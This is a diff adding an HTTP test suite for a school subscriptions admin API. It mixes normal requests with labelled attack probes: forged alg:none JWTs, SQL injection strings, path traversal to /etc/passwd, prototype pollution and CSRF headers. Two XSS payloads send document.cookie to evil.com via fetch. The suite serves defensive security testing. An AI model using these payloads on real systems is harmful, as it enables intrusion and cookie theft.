@@ -1,0 +1,979 @@
+# =============================================================================
+# RESQID — Super Admin | Subscriptions Module HTTP Test Suite
+# Covers: Happy Path, Attack Vectors, Edge Cases, Auth/RBAC Guards
+# Tool: REST Client (VS Code) or IntelliJ HTTP Client
+# =============================================================================
+
+@baseUrl     = http://localhost:3000/api/super-admin/subscriptions
+@contentType = application/json
+
+# ─── Fill these after login ───────────────────────────────────────────────────
+@accessToken     = PASTE_SUPER_ADMIN_ACCESS_TOKEN_HERE
+@schoolAdminToken = PASTE_SCHOOL_ADMIN_ACCESS_TOKEN_HERE
+@parentToken     = PASTE_PARENT_ACCESS_TOKEN_HERE
+
+# ─── Fill these with real IDs from your DB ────────────────────────────────────
+@validSubId    = PASTE_VALID_SUBSCRIPTION_ID_HERE
+@activeSubId   = PASTE_ACTIVE_SUBSCRIPTION_ID_HERE
+@trialingSubId = PASTE_TRIALING_SUBSCRIPTION_ID_HERE
+@canceledSubId = PASTE_CANCELED_SUBSCRIPTION_ID_HERE
+@expiredSubId  = PASTE_EXPIRED_SUBSCRIPTION_ID_HERE
+@pastDueSubId  = PASTE_PAST_DUE_SUBSCRIPTION_ID_HERE
+
+
+# =============================================================================
+# 1. GET /subscriptions/stats
+# =============================================================================
+
+### [HAPPY] Stats — valid super admin
+GET {{baseUrl}}/stats
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Stats — no auth token
+GET {{baseUrl}}/stats
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Stats — school admin token (wrong role)
+GET {{baseUrl}}/stats
+Authorization: Bearer {{schoolAdminToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Stats — parent token (wrong role)
+GET {{baseUrl}}/stats
+Authorization: Bearer {{parentToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Stats — forged JWT (alg:none)
+GET {{baseUrl}}/stats
+Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJTVVBFUl9BRE1JTiJ9.
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Stats — tampered role in JWT
+GET {{baseUrl}}/stats
+Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJTVVBFUl9BRE1JTiIsInNlc3Npb25JZCI6ImZha2UifQ.invalidsig
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Stats — expired access token
+GET {{baseUrl}}/stats
+Authorization: Bearer PASTE_EXPIRED_TOKEN_HERE
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Stats — HTTP verb tampering (POST on GET-only route)
+POST {{baseUrl}}/stats
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+
+# =============================================================================
+# 2. GET /subscriptions  (List + Filters)
+# =============================================================================
+
+### [HAPPY] List — default (no filters)
+GET {{baseUrl}}/
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — filter by status ACTIVE
+GET {{baseUrl}}/?status=ACTIVE
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — filter by status TRIALING
+GET {{baseUrl}}/?status=TRIALING
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — filter by status PAST_DUE
+GET {{baseUrl}}/?status=PAST_DUE
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — filter by status CANCELED
+GET {{baseUrl}}/?status=CANCELED
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — filter by status EXPIRED
+GET {{baseUrl}}/?status=EXPIRED
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — filter by plan BASIC
+GET {{baseUrl}}/?plan=BASIC
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — filter by plan PREMIUM
+GET {{baseUrl}}/?plan=PREMIUM
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — filter by plan CUSTOM
+GET {{baseUrl}}/?plan=CUSTOM
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — search by school name
+GET {{baseUrl}}/?search=Delhi
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — search by school code
+GET {{baseUrl}}/?search=DPS-DL
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — overdue subscriptions (balance_due > 0)
+GET {{baseUrl}}/?overdue=true
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — pilot subscriptions only
+GET {{baseUrl}}/?is_pilot=true
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — sort by balance_due desc (highest debt first)
+GET {{baseUrl}}/?sortBy=balance_due&sortDir=desc
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — sort by current_period_end asc (expiring soon first)
+GET {{baseUrl}}/?sortBy=current_period_end&sortDir=asc
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — pagination page 2
+GET {{baseUrl}}/?page=2&limit=10
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — max limit 100
+GET {{baseUrl}}/?limit=100
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] List — combined filters (ACTIVE PREMIUM overdue)
+GET {{baseUrl}}/?status=ACTIVE&plan=PREMIUM&overdue=true&sortBy=balance_due&sortDir=desc
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [EDGE] List — page 0 (should coerce to 1)
+GET {{baseUrl}}/?page=0
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [EDGE] List — negative page (should coerce to 1)
+GET {{baseUrl}}/?page=-5
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [EDGE] List — limit 0 (should use minimum)
+GET {{baseUrl}}/?limit=0
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [EDGE] List — limit above max 100 (should cap at 100)
+GET {{baseUrl}}/?limit=9999
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [EDGE] List — invalid status value (should 422)
+GET {{baseUrl}}/?status=PENDING
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [EDGE] List — invalid plan value
+GET {{baseUrl}}/?plan=ENTERPRISE
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [EDGE] List — invalid sortBy field (not in allowed enum)
+GET {{baseUrl}}/?sortBy=school_name
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [EDGE] List — search with special chars (should not crash)
+GET {{baseUrl}}/?search=Delhi%20Public%20School
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] List — SQL injection in search param
+GET {{baseUrl}}/?search='; DROP TABLE "Subscription";--
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] List — XSS in search param
+GET {{baseUrl}}/?search=<script>alert(1)</script>
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] List — path traversal in search
+GET {{baseUrl}}/?search=../../../../etc/passwd
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] List — no auth
+GET {{baseUrl}}/
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] List — school admin token (wrong role)
+GET {{baseUrl}}/
+Authorization: Bearer {{schoolAdminToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] List — prototype pollution in query string
+GET {{baseUrl}}/?__proto__[isAdmin]=true&constructor[prototype][isAdmin]=true
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] List — oversized search string (>100 chars, should 422)
+GET {{baseUrl}}/?search=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+
+# =============================================================================
+# 3. GET /subscriptions/:id  (Single Detail)
+# =============================================================================
+
+### [HAPPY] Get by ID — valid subscription
+GET {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] Get by ID — active subscription (has invoices + payments)
+GET {{baseUrl}}/{{activeSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [HAPPY] Get by ID — canceled subscription
+GET {{baseUrl}}/{{canceledSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [EDGE] Get by ID — non-existent ID (should 404)
+GET {{baseUrl}}/00000000-0000-0000-0000-000000000000
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Get by ID — SQL injection in ID param
+GET {{baseUrl}}/' OR '1'='1
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Get by ID — path traversal
+GET {{baseUrl}}/../schools
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Get by ID — no auth
+GET {{baseUrl}}/{{validSubId}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Get by ID — school admin token (wrong role)
+GET {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{schoolAdminToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Get by ID — malformed UUID (not a UUID at all)
+GET {{baseUrl}}/not-a-uuid
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Get by ID — extremely long ID
+GET {{baseUrl}}/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+
+# =============================================================================
+# 4. PATCH /subscriptions/:id  (Update Plan / Pricing)
+# =============================================================================
+
+### [HAPPY] Update — change plan BASIC → PREMIUM (with note)
+PATCH {{baseUrl}}/{{trialingSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "plan": "PREMIUM",
+  "unit_price_snapshot": 59900,
+  "renewal_price_snapshot": 49900,
+  "note": "School upgraded to Premium after demo — approved by ops team"
+}
+
+###
+
+### [HAPPY] Update — enable custom pricing on CUSTOM plan
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "plan": "CUSTOM",
+  "unit_price_snapshot": 39900,
+  "renewal_price_snapshot": 35000,
+  "is_custom_pricing": true,
+  "custom_price_note": "Bulk deal — 900 students, negotiated by BD team",
+  "note": "Custom pricing approved for large school"
+}
+
+###
+
+### [HAPPY] Update — enable pilot mode
+PATCH {{baseUrl}}/{{trialingSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "is_pilot": true,
+  "pilot_expires_at": "2025-09-30T23:59:59.000Z",
+  "note": "3-month pilot approved for government school partnership"
+}
+
+###
+
+### [HAPPY] Update — extend current period end
+PATCH {{baseUrl}}/{{activeSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "current_period_end": "2026-03-31T23:59:59.000Z",
+  "note": "Period extended due to delayed card delivery"
+}
+
+###
+
+### [HAPPY] Update — change advance percent
+PATCH {{baseUrl}}/{{trialingSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "advance_percent": 30,
+  "note": "Advance reduced to 30% for new government school"
+}
+
+###
+
+### [EDGE] Update — empty body (no-op, should succeed or 422)
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{}
+
+###
+
+### [EDGE] Update — price change without note (should 422)
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "unit_price_snapshot": 45000
+}
+
+###
+
+### [EDGE] Update — is_custom_pricing true without custom_price_note (should 422)
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "plan": "CUSTOM",
+  "is_custom_pricing": true,
+  "note": "Missing custom_price_note field"
+}
+
+###
+
+### [EDGE] Update — is_pilot true without pilot_expires_at (should 422)
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "is_pilot": true,
+  "note": "Missing pilot_expires_at field"
+}
+
+###
+
+### [EDGE] Update — CUSTOM plan with is_custom_pricing false (should 400)
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "plan": "CUSTOM",
+  "is_custom_pricing": false,
+  "note": "This combination should be rejected"
+}
+
+###
+
+### [EDGE] Update — canceled subscription (should 400)
+PATCH {{baseUrl}}/{{canceledSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "plan": "PREMIUM",
+  "unit_price_snapshot": 59900,
+  "renewal_price_snapshot": 49900,
+  "note": "Trying to update a canceled subscription"
+}
+
+###
+
+### [EDGE] Update — expired subscription (should 400)
+PATCH {{baseUrl}}/{{expiredSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "plan": "BASIC",
+  "unit_price_snapshot": 29900,
+  "renewal_price_snapshot": 24900,
+  "note": "Trying to update an expired subscription"
+}
+
+###
+
+### [EDGE] Update — negative unit price (should 422)
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "unit_price_snapshot": -5000,
+  "note": "Negative price attempt"
+}
+
+###
+
+### [EDGE] Update — advance_percent above 100 (should 422)
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "advance_percent": 150,
+  "note": "Invalid advance percent"
+}
+
+###
+
+### [EDGE] Update — non-existent subscription (should 404)
+PATCH {{baseUrl}}/00000000-0000-0000-0000-000000000000
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "plan": "BASIC",
+  "unit_price_snapshot": 29900,
+  "renewal_price_snapshot": 24900,
+  "note": "Non-existent ID"
+}
+
+###
+
+### [ATTACK] Update — no auth
+PATCH {{baseUrl}}/{{validSubId}}
+Content-Type: {{contentType}}
+
+{
+  "plan": "BASIC",
+  "unit_price_snapshot": 29900,
+  "renewal_price_snapshot": 24900,
+  "note": "Unauthenticated update attempt"
+}
+
+###
+
+### [ATTACK] Update — school admin token (wrong role)
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{schoolAdminToken}}
+Content-Type: {{contentType}}
+
+{
+  "plan": "BASIC",
+  "unit_price_snapshot": 29900,
+  "renewal_price_snapshot": 24900,
+  "note": "School admin trying to update subscription"
+}
+
+###
+
+### [ATTACK] Update — SQL injection in plan field
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "plan": "BASIC'; DROP TABLE \"Subscription\";--",
+  "note": "SQL injection attempt"
+}
+
+###
+
+### [ATTACK] Update — XSS in note field
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "is_pilot": true,
+  "pilot_expires_at": "2025-09-30T23:59:59.000Z",
+  "note": "<script>fetch('https://evil.com/?c='+document.cookie)</script>"
+}
+
+###
+
+### [ATTACK] Update — prototype pollution in body
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "__proto__": { "isAdmin": true },
+  "constructor": { "prototype": { "isAdmin": true } },
+  "note": "Prototype pollution attempt"
+}
+
+###
+
+### [ATTACK] Update — inject extra Prisma fields (should be stripped by service)
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "total_received": 9999999,
+  "balance_due": 0,
+  "status": "ACTIVE",
+  "note": "Trying to manipulate billing totals directly"
+}
+
+###
+
+### [ATTACK] Update — invalid datetime format for pilot_expires_at
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "is_pilot": true,
+  "pilot_expires_at": "31-12-2025",
+  "note": "Invalid date format"
+}
+
+###
+
+### [ATTACK] Update — array as plan value (type confusion)
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "plan": ["BASIC", "PREMIUM"],
+  "note": "Array type confusion"
+}
+
+###
+
+### [ATTACK] Update — oversized note (>500 chars, should 422)
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "plan": "PREMIUM",
+  "unit_price_snapshot": 59900,
+  "renewal_price_snapshot": 49900,
+  "note": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+}
+
+###
+
+### [ATTACK] Update — CSRF simulation (cross-origin request with stolen token)
+PATCH {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+Origin: https://evil.com
+Referer: https://evil.com/csrf
+
+{
+  "plan": "BASIC",
+  "unit_price_snapshot": 100,
+  "renewal_price_snapshot": 100,
+  "note": "CSRF attempt"
+}
+
+###
+
+### [ATTACK] Update — HTTP verb tunneling via _method override
+POST {{baseUrl}}/{{validSubId}}
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+X-HTTP-Method-Override: PATCH
+
+{
+  "plan": "BASIC",
+  "unit_price_snapshot": 29900,
+  "renewal_price_snapshot": 24900,
+  "note": "Method override attempt"
+}
+
+
+# =============================================================================
+# 5. POST /subscriptions/:id/cancel
+# =============================================================================
+
+### [HAPPY] Cancel — immediate (cancel_at_period_end false)
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "School requested cancellation — switching to competitor",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [HAPPY] Cancel — at period end (school retains access)
+POST {{baseUrl}}/{{trialingSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "Trial ended, school decided not to continue",
+  "cancel_at_period_end": true
+}
+
+###
+
+### [HAPPY] Cancel — past due subscription
+POST {{baseUrl}}/{{pastDueSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "Non-payment after 60 days — canceling per policy",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [EDGE] Cancel — already canceled subscription (should 409)
+POST {{baseUrl}}/{{canceledSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "Trying to cancel an already canceled subscription",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [EDGE] Cancel — expired subscription (should 400)
+POST {{baseUrl}}/{{expiredSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "Trying to cancel an expired subscription",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [EDGE] Cancel — non-existent subscription (should 404)
+POST {{baseUrl}}/00000000-0000-0000-0000-000000000000/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "Non-existent subscription",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [EDGE] Cancel — missing reason (should 422)
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "cancel_at_period_end": false
+}
+
+###
+
+### [EDGE] Cancel — reason too short under 5 chars (should 422)
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "ok",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [EDGE] Cancel — reason exceeds 500 chars (should 422)
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [EDGE] Cancel — missing cancel_at_period_end (should default to true)
+POST {{baseUrl}}/{{trialingSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "Testing default cancel_at_period_end behavior"
+}
+
+###
+
+### [ATTACK] Cancel — no auth
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Content-Type: {{contentType}}
+
+{
+  "reason": "Unauthenticated cancel attempt",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [ATTACK] Cancel — school admin token (wrong role)
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer {{schoolAdminToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "School admin trying to cancel own subscription",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [ATTACK] Cancel — parent token (wrong role)
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer {{parentToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "Parent trying to cancel subscription",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [ATTACK] Cancel — XSS in reason field
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [ATTACK] Cancel — SQL injection in reason
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "'; UPDATE \"Subscription\" SET status='ACTIVE' WHERE '1'='1",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [ATTACK] Cancel — inject extra fields (should be stripped)
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "Trying to inject extra fields",
+  "cancel_at_period_end": false,
+  "status": "ACTIVE",
+  "balance_due": 0,
+  "agreed_by": "hacker-id"
+}
+
+###
+
+### [ATTACK] Cancel — forged JWT
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJoYWNrZXIiLCJyb2xlIjoiU1VQRVJfQURNSU4iLCJzZXNzaW9uSWQiOiJmYWtlIn0.
+Content-Type: {{contentType}}
+
+{
+  "reason": "Forged JWT cancel attempt",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [ATTACK] Cancel — double cancel (idempotency check)
+# First cancel succeeds, second should return 409
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "First cancel",
+  "cancel_at_period_end": false
+}
+
+###
+
+# Run immediately after the above
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "Second cancel — should 409",
+  "cancel_at_period_end": false
+}
+
+###
+
+### [ATTACK] Cancel — HTTP verb tampering (GET on POST route)
+GET {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+###
+
+### [ATTACK] Cancel — oversized JSON body
+POST {{baseUrl}}/{{activeSubId}}/cancel
+Authorization: Bearer {{accessToken}}
+Content-Type: {{contentType}}
+
+{
+  "reason": "Legitimate reason",
+  "cancel_at_period_end": false,
+  "junk": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+}
